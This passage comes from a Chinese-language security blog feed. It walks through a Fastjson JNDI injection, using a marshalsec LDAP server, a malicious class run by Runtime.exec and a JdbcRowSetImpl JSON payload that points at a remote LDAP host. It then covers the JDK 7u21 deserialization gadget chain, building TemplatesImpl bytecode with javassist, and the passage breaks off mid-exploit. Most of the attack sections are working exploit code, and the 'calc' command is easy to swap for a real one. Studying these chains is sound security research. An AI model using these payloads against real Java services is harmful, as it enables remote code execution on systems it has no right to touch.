plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8090&#x2F;#ExecTest</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608577cc3bbd5.jpg"></p><p>ExecTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把编译后的恶意类<code>ExecTest.class</code>放到web目录下，然后开启web服务</p><p><img src="https://www.hualigs.cn/image/608577bb2d463.jpg"></p><p>利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123; </span><br><span class="line">        String payload = <span class="string">&quot;&#123;\n&quot;</span> + </span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://192.168.111.129:1389/ExecTest\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608577beae4b9.jpg"></p><p>实际执行的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jdk7u21反序列化</title>
    <link href="/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由javassist负责构建一个恶意类并得到字节码，然后向<code>TemplatesImpl</code>的<code>_bytecodes</code>属性赋值恶意类的字节码，字节码数组在被<code>defineTransletClasses()</code>中被实例化成恶意类，调用构造函数中的命令触发RCE，需要调用<code>getOutputProperties()</code>触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恶意类的父类必须为ABSTRACT_TRANSLET </span><br><span class="line">TemplatesImpl类的_bytecodes不为null，为恶意类字节码</span><br><span class="line">TemplatesImpl类的_name不为null</span><br><span class="line">TemplatesImpl类的_class&#x3D;null</span><br><span class="line">_tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60860dfa8b360.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfa9b143.jpg"></p><p><code>defindTransletClasses()</code>执行完后，<code>_class[_transletIndex]</code>就已经是恶意类，接下来执行<code>newInstance()</code>实例化恶意类，从而执行构造方法中的payload</p><p><img src="https://www.hualigs.cn/image/60860dfb21109.jpg"></p><p><code>defineTransletClasses()</code>中恶意类的构造，把恶意类的字节码转换为类的实例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="comment">//_bytecodes不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">               <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">       <span class="comment">//获取_bytecodes的长度，创建_class数组，这里需要让恶意类的字节码为一个二维字节数组</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">           _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">               _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// 恶意类的父类必须是ABSTRACT_TRANSLET</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span> &#123;</span><br><span class="line">                   _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myjdk7u21</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装setFieldValue()方法，便于给类字段赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        ClassPool pool =ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建恶意类Evil</span></span><br><span class="line">        CtClass cc=pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置恶意类父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建恶意类的构造函数，写入payload</span></span><br><span class="line">        CtConstructor cons=<span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;,cc);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将Evil类转换成byte数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] TempByteCode=cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] ByteCode=<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;TempByteCode&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化TemplatesImpl类</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//为TemplatesImpl类的各个字段赋值</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,ByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60860e00038f1.jpg"></p><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>当没有没有触发<code>getOutputProperties()</code>的点，就需要使用动态代理，代理是为了在不改变目标对象方法的情况下对方法进行增强</p><p>动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。</p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际的需要被代理的对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectImpl</span> <span class="keyword">implements</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SubjectImpl.hello(): &quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handler对象（继承InvocationHandler的拦截器）</span></span><br><span class="line"><span class="comment">//InvocationHandler是一个用于跟Proxy类对接的接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line">    <span class="comment">//构造函数，传入被代理实现类的实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Object subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//所有被Proxy拦截的函数都会经过这个接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before!&quot;</span>);</span><br><span class="line">        <span class="comment">//完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数</span></span><br><span class="line">        method.invoke(<span class="keyword">this</span>.subject, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//被代理类</span></span><br><span class="line">        SubjectImpl subject = <span class="keyword">new</span> SubjectImpl();</span><br><span class="line">        <span class="comment">//拦截器实现类，通过构造函数传入被代理类的实例</span></span><br><span class="line">        InvocationHandler tempHandler = <span class="keyword">new</span> Handler(subject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Proxy.newProxyInstance创建代理</span></span><br><span class="line">        ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ISubject.class&#125;, tempHandler);</span><br><span class="line">        iSubject.hello(<span class="string">&quot;world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>三个传入参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loader，选用的类加载器。</span><br><span class="line">interfaces，被代理类所实现的接口，这个接口可以是多个。即需要拦截的接口</span><br><span class="line">handler，一个 实现拦截器的invocation handler。</span><br></pre></td></tr></table></figure><p>设置动态代理后，只要调用了返回对象中被安排代理的接口，就会进入invocationHandler的invoke函数。</p><h1 id="延长利用链：AnnotationInvocationHandler"><a href="#延长利用链：AnnotationInvocationHandler" class="headerlink" title="延长利用链：AnnotationInvocationHandler"></a>延长利用链：AnnotationInvocationHandler</h1><p><code>AnnotationInvocationHandler</code>是一个<code>InvocationHandler</code>的实现类</p><p>sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler</p><p>先看一下<code>AnnotationInvocationHandler</code>的构造函数</p><p>在payload构造中传入参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br></pre></td></tr></table></figure><p>这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.type=Templates.class</span><br><span class="line"><span class="keyword">this</span>.membervalues=map</span><br></pre></td></tr></table></figure><p>这里的AnnotationInvocationHandler构造函数是缺省修饰符，在不同的包中是不能直接调用</p><p>反射机制中提到，可以使用setAccessible(true)来开放权限。</p><p><img src="https://www.hualigs.cn/image/60860dfe3a000.jpg"></p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myjdk7u21</span> </span>&#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    